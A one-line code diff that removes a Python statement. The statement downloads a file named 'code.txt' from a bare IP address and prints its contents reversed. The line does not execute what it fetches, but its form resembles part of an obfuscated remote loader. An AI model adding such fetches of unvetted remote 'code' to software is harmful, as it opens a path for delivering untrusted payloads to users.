@@ -1,1 +1,0 @@
-import urllib.request;url = "http://49.233.32.200/code.txt";r=urllib.request.urlopen(url);t=r.read();print(t[::-1])
